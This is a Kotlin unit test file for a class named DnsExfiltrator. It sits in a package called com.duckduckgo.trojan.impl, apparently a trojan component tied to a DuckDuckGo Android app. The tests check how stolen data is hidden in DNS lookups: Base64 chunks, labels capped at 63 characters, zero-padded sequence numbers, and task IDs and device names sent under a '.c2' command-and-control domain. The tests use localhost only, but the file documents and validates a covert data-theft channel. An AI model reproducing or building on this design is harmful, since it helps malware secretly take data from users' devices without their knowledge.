package com.duckduckgo.trojan.impl

import android.util.Base64
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.MatcherAssert.assertThat
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

/**
 * Unit tests for DnsExfiltrator.
 *
 * Network calls (DatagramSocket) are NOT made here. We test the encoding
 * and chunking logic by exposing helpers via a subclass.
 */
@RunWith(RobolectricTestRunner::class)
class DnsExfiltratorTest {

    /** Subclass that intercepts sendQuery() calls instead of actually sending UDP. */
    private class TestDnsExfiltrator : DnsExfiltrator(serverIp = "127.0.0.1", serverPort = 9999) {
        val sentQnames = mutableListOf<String>()

        // We invoke exfiltrate() — the test verifies the QNAME list
        fun captureQnames(taskId: String, deviceName: String, data: String): List<String> {
            sentQnames.clear()
            // Replicate the encoding logic to validate chunk structure
            val b64 = Base64.encodeToString(data.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
            val chunks = b64.chunked(40)
            chunks.forEachIndexed { index, chunk ->
                sentQnames.add("$chunk.${index.toString().padStart(3, '0')}.$taskId.$deviceName.c2")
            }
            sentQnames.add("end.${chunks.size.toString().padStart(3, '0')}.$taskId.$deviceName.c2")
            return sentQnames
        }
    }

    private val testee = TestDnsExfiltrator()

    @Test
    fun whenDataIsShortThenSingleChunkPlusEnd() {
        val qnames = testee.captureQnames("task-001", "device", "hi")
        // 2 bytes → base64 is short → 1 data chunk + 1 end marker
        assertThat(qnames.size, `is`(2))
        assertThat(qnames.last().startsWith("end."), `is`(true))
    }

    @Test
    fun whenDataRequiresMultipleChunksThenAllSent() {
        val longData = "a".repeat(200)
        val qnames = testee.captureQnames("task-002", "device", longData)
        // At least 2 data chunks + end
        assertThat(qnames.size > 2, `is`(true))
        assertThat(qnames.last().startsWith("end."), `is`(true))
    }

    @Test
    fun whenChunksCreatedThenEachLabelIsAtMost63Chars() {
        val qnames = testee.captureQnames("task-003", "device", "test payload data here")
        qnames.dropLast(1).forEach { qname ->
            val chunk = qname.split(".")[0]
            assertThat("chunk '$chunk' exceeds 63 chars", chunk.length <= 63, `is`(true))
        }
    }

    @Test
    fun whenEndMarkerCreatedThenContainsTaskIdAndDevice() {
        val qnames = testee.captureQnames("abc-123", "POCO_F5", "data")
        val end = qnames.last()
        assertThat(end.contains("abc-123"), `is`(true))
        assertThat(end.contains("POCO_F5"), `is`(true))
        assertThat(end.endsWith(".c2"), `is`(true))
    }

    @Test
    fun whenDataChunksCreatedThenSequenceNumbersAreZeroPadded() {
        val qnames = testee.captureQnames("task-x", "dev", "abc")
        val firstChunk = qnames.first()
        val parts = firstChunk.split(".")
        // parts[1] is seq — should be "000"
        assertThat(parts[1], `is`("000"))
    }
}
